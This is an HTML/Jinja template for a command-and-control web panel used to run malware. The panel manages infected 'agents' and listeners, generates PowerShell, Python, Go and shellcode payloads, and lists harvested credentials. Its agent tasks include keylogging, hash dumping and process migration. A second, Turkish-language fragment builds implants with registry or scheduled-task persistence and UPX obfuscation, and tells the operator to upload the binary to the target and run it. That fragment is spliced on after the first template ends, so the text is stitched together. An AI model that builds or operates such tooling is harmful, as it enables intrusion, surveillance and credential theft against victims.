{% extends "base.html" %}
{% block head %}
    <style>
        :root {
            --primary: #00ff00;
            --danger: #ff3333;
            --warning: #ffaa00;
            --info: #00aaff;
            --purple: #9933ff;
        }
        body {
            background: #0f0f23;
            color: #eee;
        }
        .card {
            background: rgba(30, 30, 46, 0.95);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .card-title {
            color: var(--primary);
            border-bottom: 1px solid rgba(0, 255, 0, 0.3);
            padding-bottom: 10px;
        }
        .form-control, .form-select {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(0, 255, 0, 0.5);
            color: #fff;
        }
        .form-control:focus, .form-select:focus {
            border-color: var(--primary);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            background: rgba(0, 0, 0, 0.8);
            color: #fff;
        }
        .btn-c2 {
            background: linear-gradient(90deg, #9933ff, #6600cc);
            border: none;
            color: white;
            font-weight: bold;
        }
        .btn-c2:hover {
            box-shadow: 0 0 20px rgba(153, 51, 255, 0.5);
        }
        .nav-tabs .nav-link {
            color: #888;
            border: none;
            border-bottom: 2px solid transparent;
        }
        .nav-tabs .nav-link.active {
            color: var(--purple);
            background: transparent;
            border-bottom: 2px solid var(--purple);
        }
        .agent-card {
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
        }
        .agent-card.dead {
            background: rgba(255, 0, 0, 0.05);
            border-color: rgba(255, 0, 0, 0.3);
        }
        .listener-card {
            background: rgba(153, 51, 255, 0.1);
            border: 1px solid var(--purple);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
        }
        .status-badge {
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 0.8em;
        }
        .status-active { background: rgba(0, 255, 0, 0.2); color: #0f0; }
        .status-dead { background: rgba(255, 0, 0, 0.2); color: #f33; }
        .status-running { background: rgba(0, 170, 255, 0.2); color: #0af; }
        .status-stopped { background: rgba(255, 170, 0, 0.2); color: #fa0; }
        .task-row { padding: 8px; border-bottom: 1px solid #333; }
        .task-row:hover { background: rgba(255, 255, 255, 0.05); }
        .payload-code {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            max-height: 400px;
            overflow: auto;
        }
    </style>
{% endblock %}
{% block body %}
    <nav class="navbar navbar-expand-lg sticky-top" style="background: rgba(0, 0, 0, 0.9); border-bottom: 2px solid #9933ff;">
        <div class="container-fluid">
            <a class="navbar-brand" style="color: #9933ff; font-weight: bold;" href="/c2">
                <i class="bi bi-cpu-fill"></i> C2 COMMAND & CONTROL
            </a>
            <div class="d-flex align-items-center">
                <span class="badge bg-success me-3" id="agentCount">0 Agents</span>
                <span class="badge bg-info me-3" id="listenerCount">0 Listeners</span>
                <a href="/" class="btn btn-outline-light btn-sm me-2"><i class="bi bi-house"></i> Dashboard</a>
                <span class="navbar-text text-white"><i class="bi bi-person-circle"></i> {{ session.get('user') }}</span>
            </div>
        </div>
    </nav>

    <div class="container-fluid mt-4">
        <!-- Tabs -->
        <ul class="nav nav-tabs mb-4" id="c2Tabs">
            <li class="nav-item">
                <a class="nav-link active" data-bs-toggle="tab" href="#agentsTab">
                    <i class="bi bi-pc-display"></i> Agents
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" data-bs-toggle="tab" href="#listenersTab">
                    <i class="bi bi-broadcast"></i> Listeners
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" data-bs-toggle="tab" href="#tasksTab">
                    <i class="bi bi-list-task"></i> Tasks
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" data-bs-toggle="tab" href="#payloadsTab">
                    <i class="bi bi-file-binary"></i> Payloads
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" data-bs-toggle="tab" href="#credentialsTab">
                    <i class="bi bi-key"></i> Credentials
                </a>
            </li>
        </ul>

        <div class="tab-content">
            <!-- Agents Tab -->
            <div class="tab-pane fade show active" id="agentsTab">
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <div class="d-flex justify-content-between align-items-center mb-3">
                                    <h4 class="card-title mb-0"><i class="bi bi-pc-display"></i> Active Agents</h4>
                                    <button class="btn btn-sm btn-outline-success" onclick="refreshAgents()">
                                        <i class="bi bi-arrow-clockwise"></i> Refresh
                                    </button>
                                </div>
                                <div id="agentsList">
                                    {% if agents %}
                                        {% for agent in agents %}
                                        <div class="agent-card {{ 'dead' if agent.status == 'dead' else '' }}">
                                            <div class="d-flex justify-content-between align-items-start">
                                                <div>
                                                    <h5 class="mb-1">
                                                        <i class="bi bi-pc-display-horizontal"></i> 
                                                        {{ agent.hostname }}
                                                        <span class="status-badge status-{{ agent.status }}">{{ agent.status }}</span>
                                                    </h5>
                                                    <small class="text-muted">
                                                        <i class="bi bi-person"></i> {{ agent.username }} |
                                                        <i class="bi bi-windows"></i> {{ agent.os_info }} |
                                                        <i class="bi bi-cpu"></i> {{ agent.arch }} |
                                                        <i class="bi bi-globe"></i> {{ agent.ip_address }}
                                                    </small>
                                                </div>
                                                <div>
                                                    <button class="btn btn-sm btn-outline-primary" onclick="interactAgent('{{ agent.agent_id }}')">
                                                        <i class="bi bi-terminal"></i> Interact
                                                    </button>
                                                    <button class="btn btn-sm btn-outline-danger" onclick="killAgent('{{ agent.agent_id }}')">
                                                        <i class="bi bi-x-circle"></i> Kill
                                                    </button>
                                                </div>
                                            </div>
                                            <div class="mt-2">
                                                <small class="text-muted">
                                                    First Seen: {{ agent.first_seen }} | 
                                                    Last Seen: {{ agent.last_seen }} |
                                                    Sleep: {{ agent.sleep_interval }}s
                                                </small>
                                            </div>
                                        </div>
                                        {% endfor %}
                                    {% else %}
                                        <div class="text-center text-muted py-5">
                                            <i class="bi bi-inbox" style="font-size: 3em;"></i>
                                            <p>No agents connected. Deploy a payload to get started.</p>
                                        </div>
                                    {% endif %}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Listeners Tab -->
            <div class="tab-pane fade" id="listenersTab">
                <div class="row">
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="card-title"><i class="bi bi-plus-circle"></i> Create Listener</h4>
                                <div class="mb-3">
                                    <label class="form-label">Name</label>
                                    <input type="text" id="listenerName" class="form-control" value="http-listener">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Type</label>
                                    <select id="listenerType" class="form-select">
                                        <option value="http">HTTP</option>
                                        <option value="https">HTTPS</option>
                                        <option value="dns">DNS</option>
                                        <option value="tcp">TCP</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Host</label>
                                    <input type="text" id="listenerHost" class="form-control" value="0.0.0.0">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Port</label>
                                    <input type="number" id="listenerPort" class="form-control" value="8443">
                                </div>
                                <button class="btn btn-c2 w-100" onclick="createListener()">
                                    <i class="bi bi-broadcast"></i> Create Listener
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-8">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="card-title"><i class="bi bi-broadcast"></i> Active Listeners</h4>
                                <div id="listenersList">
                                    {% if listeners %}
                                        {% for listener in listeners %}
                                        <div class="listener-card">
                                            <div class="d-flex justify-content-between">
                                                <div>
                                                    <h5>{{ listener.name }}</h5>
                                                    <small>
                                                        <span class="badge bg-info">{{ listener.listener_type }}</span>
                                                        {{ listener.host }}:{{ listener.port }}
                                                    </small>
                                                </div>
                                                <div>
                                                    <span class="status-badge status-{{ listener.status }}">{{ listener.status }}</span>
                                                    <button class="btn btn-sm btn-outline-success" onclick="startListener('{{ listener.listener_id }}')">
                                                        <i class="bi bi-play"></i>
                                                    </button>
                                                    <button class="btn btn-sm btn-outline-warning" onclick="stopListener('{{ listener.listener_id }}')">
                                                        <i class="bi bi-stop"></i>
                                                    </button>
                                                    <button class="btn btn-sm btn-outline-danger" onclick="deleteListener('{{ listener.listener_id }}')">
                                                        <i class="bi bi-trash"></i>
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                        {% endfor %}
                                    {% else %}
                                        <div class="text-center text-muted py-4">No listeners created yet.</div>
                                    {% endif %}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Tasks Tab -->
            <div class="tab-pane fade" id="tasksTab">
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title"><i class="bi bi-list-task"></i> Task Queue</h4>
                        <div id="tasksList">
                            {% if recent_tasks %}
                                <table class="table table-dark table-hover">
                                    <thead>
                                        <tr>
                                            <th>Agent</th>
                                            <th>Command</th>
                                            <th>Status</th>
                                            <th>Created</th>
                                            <th>Output</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {% for task in recent_tasks %}
                                        <tr>
                                            <td><code>{{ task.agent_id[:8] }}...</code></td>
                                            <td><code>{{ task.command }} {{ task.args|join(' ') }}</code></td>
                                            <td><span class="status-badge status-{{ task.status }}">{{ task.status }}</span></td>
                                            <td>{{ task.created_at }}</td>
                                            <td>
                                                {% if task.output %}
                                                <button class="btn btn-sm btn-outline-info" onclick="showOutput('{{ task.task_id }}')">
                                                    View
                                                </button>
                                                {% else %}
                                                -
                                                {% endif %}
                                            </td>
                                        </tr>
                                        {% endfor %}
                                    </tbody>
                                </table>
                            {% else %}
                                <div class="text-center text-muted py-4">No tasks in queue.</div>
                            {% endif %}
                        </div>
                    </div>
                </div>
            </div>

            <!-- Payloads Tab -->
            <div class="tab-pane fade" id="payloadsTab">
                <div class="row">
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="card-title"><i class="bi bi-file-binary"></i> Generate Payload</h4>
                                <div class="mb-3">
                                    <label class="form-label">Payload Type</label>
                                    <select id="payloadType" class="form-select">
                                        <option value="python">Python</option>
                                        <option value="powershell">PowerShell</option>
                                        <option value="go">Go Binary</option>
                                        <option value="shellcode">Shellcode</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Listener</label>
                                    <select id="payloadListener" class="form-select">
                                        {% if listeners %}
                                            {% for l in listeners %}
                                            <option value="{{ l.listener_id }}">{{ l.name }} ({{ l.host }}:{{ l.port }})</option>
                                            {% endfor %}
                                        {% endif %}
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Sleep Interval (sec)</label>
                                    <input type="number" id="payloadSleep" class="form-control" value="5">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Jitter (%)</label>
                                    <input type="number" id="payloadJitter" class="form-control" value="10">
                                </div>
                                <button class="btn btn-c2 w-100" onclick="generatePayload()">
                                    <i class="bi bi-lightning"></i> Generate Payload
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-8">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="card-title"><i class="bi bi-code"></i> Generated Payload</h4>
                                <div id="payloadOutput" class="payload-code">
                                    <span class="text-muted">Generate a payload to see the code here...</span>
                                </div>
                                <div class="mt-3">
                                    <button class="btn btn-outline-success" onclick="copyPayload()">
                                        <i class="bi bi-clipboard"></i> Copy
                                    </button>
                                    <button class="btn btn-outline-info" onclick="downloadPayload()">
                                        <i class="bi bi-download"></i> Download
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Credentials Tab -->
            <div class="tab-pane fade" id="credentialsTab">
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title"><i class="bi bi-key"></i> Harvested Credentials</h4>
                        <div id="credentialsList">
                            <table class="table table-dark table-hover">
                                <thead>
                                    <tr>
                                        <th>Type</th>
                                        <th>Domain</th>
                                        <th>Username</th>
                                        <th>Password/Hash</th>
                                        <th>Source</th>
                                    </tr>
                                </thead>
                                <tbody id="credsTable">
                                    <tr>
                                        <td colspan="5" class="text-center text-muted">No credentials harvested yet.</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Agent Interaction Modal -->
    <div class="modal fade" id="agentModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content" style="background: #1e1e2e; border: 1px solid #9933ff;">
                <div class="modal-header border-0">
                    <h5 class="modal-title text-white"><i class="bi bi-terminal"></i> Agent Interaction</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Command</label>
                        <select id="taskCommand" class="form-select mb-2">
                            <option value="shell">Shell Command</option>
                            <option value="download">Download File</option>
                            <option value="upload">Upload File</option>
                            <option value="screenshot">Screenshot</option>
                            <option value="keylogger">Start Keylogger</option>
                            <option value="hashdump">Dump Hashes</option>
                            <option value="migrate">Process Migration</option>
                        </select>
                        <input type="text" id="taskArgs" class="form-control" placeholder="Arguments...">
                    </div>
                    <button class="btn btn-c2" onclick="sendTask()">
                        <i class="bi bi-send"></i> Send Task
                    </button>
                    <hr>
                    <h6>Task History</h6>
                    <div id="agentTaskHistory" style="max-height: 300px; overflow-y: auto;">
                    </div>
                </div>
            </div>
        </div>
    </div>
{% endblock %}
{% block scripts %}
    <script>
        let currentAgentId = null;
        let generatedPayload = '';

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            refreshAgents();
            refreshListeners();
            loadCredentials();
        });

        async function refreshAgents() {
            try {
                const res = await fetch('/c2/agents');
                const data = await res.json();
                document.getElementById('agentCount').textContent = `${data.agents?.length || 0} Agents`;
            } catch(e) { console.error(e); }
        }

        async function refreshListeners() {
            try {
                const res = await fetch('/c2/listeners');
                const data = await res.json();
                document.getElementById('listenerCount').textContent = `${data.listeners?.length || 0} Listeners`;
            } catch(e) { console.error(e); }
        }

        async function createListener() {
            const name = document.getElementById('listenerName').value;
            const type = document.getElementById('listenerType').value;
            const host = document.getElementById('listenerHost').value;
            const port = document.getElementById('listenerPort').value;

            try {
                const res = await fetch('/c2/listeners', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ name, type, host, port })
                });
                const data = await res.json();
                if (data.success) {
                    alert('Listener created successfully!');
                    location.reload();
                } else {
                    alert('Error: ' + data.error);
                }
            } catch(e) { alert('Error: ' + e); }
        }

        async function startListener(id) {
            await fetch(`/c2/listeners/${id}/start`, { method: 'POST' });
            location.reload();
        }

        async function stopListener(id) {
            await fetch(`/c2/listeners/${id}/stop`, { method: 'POST' });
            location.reload();
        }

        async function deleteListener(id) {
            if (!confirm('Delete this listener?')) return;
            await fetch(`/c2/listeners/${id}`, { method: 'DELETE' });
            location.reload();
        }

        function interactAgent(agentId) {
            currentAgentId = agentId;
            new bootstrap.Modal(document.getElementById('agentModal')).show();
            loadAgentTasks(agentId);
        }

        async function loadAgentTasks(agentId) {
            try {
                const res = await fetch(`/c2/tasks?agent_id=${agentId}`);
                const data = await res.json();
                const history = document.getElementById('agentTaskHistory');
                if (data.tasks && data.tasks.length > 0) {
                    history.innerHTML = data.tasks.map(t => `
                        <div class="task-row">
                            <code>${t.command} ${t.args.join(' ')}</code>
                            <span class="status-badge status-${t.status}">${t.status}</span>
                            ${t.output ? `<pre class="mt-2" style="font-size: 0.8em; color: #0f0;">${t.output}</pre>` : ''}
                        </div>
                    `).join('');
                } else {
                    history.innerHTML = '<div class="text-muted">No tasks yet.</div>';
                }
            } catch(e) { console.error(e); }
        }

        async function sendTask() {
            const command = document.getElementById('taskCommand').value;
            const args = document.getElementById('taskArgs').value.split(' ');

            try {
                const res = await fetch(`/c2/agents/${currentAgentId}/task`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ command, args })
                });
                const data = await res.json();
                if (data.success) {
                    alert('Task queued!');
                    loadAgentTasks(currentAgentId);
                } else {
                    alert('Error: ' + data.error);
                }
            } catch(e) { alert('Error: ' + e); }
        }

        async function killAgent(agentId) {
            if (!confirm('Kill this agent?')) return;
            await fetch(`/c2/agents/${agentId}/kill`, { method: 'POST' });
            location.reload();
        }

        async function generatePayload() {
            const type = document.getElementById('payloadType').value;
            const listener = document.getElementById('payloadListener').value;
            const sleep = document.getElementById('payloadSleep').value;
            const jitter = document.getElementById('payloadJitter').value;

            const output = document.getElementById('payloadOutput');
            output.innerHTML = '<span class="text-warning">Generating payload...</span>';

            try {
                const res = await fetch('/c2/payloads/generate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: type,
                        listener_id: listener,
                        options: { sleep_interval: parseInt(sleep), jitter: parseInt(jitter) }
                    })
                });
                const data = await res.json();
                if (data.payload) {
                    generatedPayload = data.payload;
                    output.innerHTML = `<pre style="color: #0f0; white-space: pre-wrap;">${escapeHtml(data.payload)}</pre>`;
                } else {
                    output.innerHTML = `<span class="text-danger">Error: ${data.error || 'Unknown error'}</span>`;
                }
            } catch(e) {
                output.innerHTML = `<span class="text-danger">Error: ${e}</span>`;
            }
        }

        function copyPayload() {
            navigator.clipboard.writeText(generatedPayload);
            alert('Payload copied to clipboard!');
        }

        function downloadPayload() {
            const type = document.getElementById('payloadType').value;
            const ext = type === 'powershell' ? 'ps1' : type === 'python' ? 'py' : 'txt';
            const blob = new Blob([generatedPayload], {type: 'text/plain'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `payload.${ext}`;
            a.click();
        }

        async function loadCredentials() {
            try {
                const res = await fetch('/c2/credentials');
                const data = await res.json();
                const tbody = document.getElementById('credsTable');
                if (data.credentials && data.credentials.length > 0) {
                    tbody.innerHTML = data.credentials.map(c => `
                        <tr>
                            <td>${c.cred_type}</td>
                            <td>${c.domain || '-'}</td>
                            <td>${c.username}</td>
                            <td><code>${c.password || c.hash || '-'}</code></td>
                            <td>${c.source}</td>
                        </tr>
                    `).join('');
                }
            } catch(e) { console.error(e); }
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function showOutput(taskId) {
            // Implement task output modal
            alert('Task output viewer - implement modal');
        }
    </script>
{% endblock %}
            </div>
        </div>
    </nav>

    <div class="container-fluid mt-4">
        <div class="row">
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-gear"></i> Implant Konfigürasyonu
                        </h4>
                        
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <label class="form-label">Implant Adı</label>
                                <input type="text" id="implantName" class="form-control" value="implant" placeholder="implant">
                            </div>
                            <div class="col-md-6 mb-3">
                                <label class="form-label">LHOST</label>
                                <input type="text" id="lhostInput" class="form-control" value="192.168.1.100" placeholder="192.168.1.100">
                            </div>
                        </div>
                        
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <label class="form-label">LPORT</label>
                                <input type="number" id="lportInput" class="form-control" value="4444" placeholder="4444">
                            </div>
                            <div class="col-md-6 mb-3">
                                <label class="form-label">Beacon Interval (saniye)</label>
                                <input type="number" id="intervalInput" class="form-control" value="30" placeholder="30">
                            </div>
                        </div>
                        
                        <div class="option-group">
                            <div class="option-title">Şifreleme</div>
                            <div class="form-check">
                                <input class="form-check-input" type="radio" name="encryption" id="encAES" value="aes256" checked>
                                <label class="form-check-label" for="encAES">AES-256 (Önerilen)</label>
                            </div>
                            <div class="form-check">
                                <input class="form-check-input" type="radio" name="encryption" id="encXOR" value="xor">
                                <label class="form-check-label" for="encXOR">XOR</label>
                            </div>
                            <div class="form-check">
                                <input class="form-check-input" type="radio" name="encryption" id="encNone" value="none">
                                <label class="form-check-label" for="encNone">Şifreleme Yok</label>
                            </div>
                        </div>
                        
                        <div class="option-group">
                            <div class="option-title">Kalıcılık (Persistence)</div>
                            <div class="form-check">
                                <input class="form-check-input" type="radio" name="persistence" id="persistReg" value="registry" checked>
                                <label class="form-check-label" for="persistReg">Registry Run Key</label>
                            </div>
                            <div class="form-check">
                                <input class="form-check-input" type="radio" name="persistence" id="persistStart" value="startup">
                                <label class="form-check-label" for="persistStart">Startup Folder</label>
                            </div>
                            <div class="form-check">
                                <input class="form-check-input" type="radio" name="persistence" id="persistTask" value="schtasks">
                                <label class="form-check-label" for="persistTask">Scheduled Task</label>
                            </div>
                        </div>
                        
                        <div class="form-check mb-3">
                            <input class="form-check-input" type="checkbox" id="obfuscateCheck">
                            <label class="form-check-label" for="obfuscateCheck">UPX Obfuscation</label>
                        </div>
                        
                        <button class="btn btn-c2 w-100" onclick="generateImplant()">
                            <i class="bi bi-cpu-fill"></i> IMPLANT ÜRET
                        </button>
                    </div>
                </div>

                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-ear"></i> C2 Listener
                        </h4>
                        <p class="text-muted">Gelen bağlantıları dinle</p>
                        
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <label class="form-label">Listener LHOST</label>
                                <input type="text" id="listenerLhost" class="form-control" value="0.0.0.0">
                            </div>
                            <div class="col-md-6 mb-3">
                                <label class="form-label">Listener LPORT</label>
                                <input type="number" id="listenerLport" class="form-control" value="4444">
                            </div>
                        </div>
                        
                        <button class="btn btn-outline-purple w-100" style="border-color: #9933ff; color: #9933ff;" onclick="createListener()">
                            <i class="bi bi-ear"></i> LİSTENER OLUŞTUR
                        </button>
                    </div>
                </div>
            </div>

            <div class="col-lg-6">
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-terminal"></i> Sonuçlar
                        </h4>
                        <div id="resultsArea">
                            <div class="text-muted text-center py-4">
                                <i class="bi bi-cpu-fill" style="font-size: 3em; opacity: 0.3;"></i>
                                <p class="mt-2">Implant üretmek için konfigürasyonu doldurun</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-info-circle"></i> Nasıl Kullanılır?
                        </h4>
                        <div class="step-box">
                            <h6>1. Listener Başlat</h6>
                            <code>python3 /tmp/c2_listener_4444.py</code>
                        </div>
                        <div class="step-box">
                            <h6>2. Implant Deploy Et</h6>
                            <p>Üretilen binary'i hedef sisteme yükle ve çalıştır</p>
                        </div>
                        <div class="step-box">
                            <h6>3. Beacon Bekle</h6>
                            <p>Hedef sistemin beacon göndermesini bekle</p>
                        </div>
                        <div class="step-box">
                            <h6>4. Komut Gönder</h6>
                            <p>Listener üzerinden komut gönder ve sonuçları al</p>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">
                            <i class="bi bi-list"></i> Üretilen Implant'lar
                        </h4>
                        <div id="implantsList">
                            <div class="text-muted text-center py-2">
                                <small>Henüz implant üretilmedi</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
{% endblock %}
{% block scripts %}
    <script>
        async function generateImplant() {
            const name = document.getElementById('implantName').value;
            const lhost = document.getElementById('lhostInput').value;
            const lport = document.getElementById('lportInput').value;
            const interval = document.getElementById('intervalInput').value;
            
            const encryption = document.querySelector('input[name="encryption"]:checked').value;
            const persistence = document.querySelector('input[name="persistence"]:checked').value;
            const obfuscate = document.getElementById('obfuscateCheck').checked;

            const resultsDiv = document.getElementById('resultsArea');
            resultsDiv.innerHTML = '<div class="text-center py-4"><i class="bi bi-gear fa-spin" style="font-size: 2em; color: #9933ff;"></i><p>Implant üretiliyor...</p></div>';

            try {
                const res = await fetch('/c2/generate-full', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        name: name,
                        lhost: lhost,
                        lport: lport,
                        interval: interval,
                        encryption: encryption,
                        persistence: persistence,
                        obfuscate: obfuscate
                    })
                });
                const data = await res.json();
                
                let html = '';
                
                if (data.success) {
                    html += `<div class="step-box success">
                        <h5 class="text-success">✅ BAŞARILI!</h5>
                        <p>Implant başarıyla üretildi!</p>
                    </div>
                    
                    <div class="listener-box">
                        <h6><i class="bi bi-file-code"></i> Kaynak Kod:</h6>
                        <code>${data.source_file}</code>
                    </div>
                    
                    <div class="listener-box">
                        <h6><i class="bi bi-cpu"></i> Binary:</h6>
                        <code>${data.binary_file}</code>
                    </div>
                    
                    <div class="listener-box">
                        <h6><i class="bi bi-ear"></i> Listener Script:</h6>
                        <code>${data.listener_file}</code>
                    </div>
                    
                    <div class="option-group">
                        <div class="option-title">Kullanım:</div>
                        <p><strong>1. Listener Başlat:</strong></p>
                        <code>python3 ${data.listener_file}</code>
                        <p class="mt-2"><strong>2. Implant Deploy:</strong></p>
                        <code>Upload ${data.binary_file} and execute</code>
                    </div>`;
                    
                    // Update implants list
                    updateImplantsList(data);
                } else {
                    html += `<div class="step-box error">
                        <h5 class="text-danger">❌ HATA</h5>
                        <p>${data.error}</p>
                    </div>`;
                }
                
                resultsDiv.innerHTML = html;
                
            } catch (e) {
                resultsDiv.innerHTML = `<div class="step-box error"><p class="text-danger">Hata: ${e}</p></div>`;
            }
        }

        async function createListener() {
            const lhost = document.getElementById('listenerLhost').value;
            const lport = document.getElementById('listenerLport').value;

            try {
                const res = await fetch('/c2/listener', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lhost: lhost, lport: lport})
                });
                const data = await res.json();
                
                if (data.success) {
                    alert(`Listener oluşturuldu!\n\nDosya: ${data.listener_file}\nKomut: ${data.command}`);
                } else {
                    alert('Hata: ' + data.error);
                }
            } catch (e) {
                alert('Hata: ' + e);
            }
        }

        function updateImplantsList(data) {
            const listDiv = document.getElementById('implantsList');
            listDiv.innerHTML = `
                <div class="d-flex justify-content-between align-items-center py-2" style="border-bottom: 1px solid #333;">
                    <span><i class="bi bi-cpu"></i> ${data.config.name}</span>
                    <span class="badge bg-success">${data.config.lhost}:${data.config.lport}</span>
                </div>
            `;
        }
    </script>
{% endblock %}
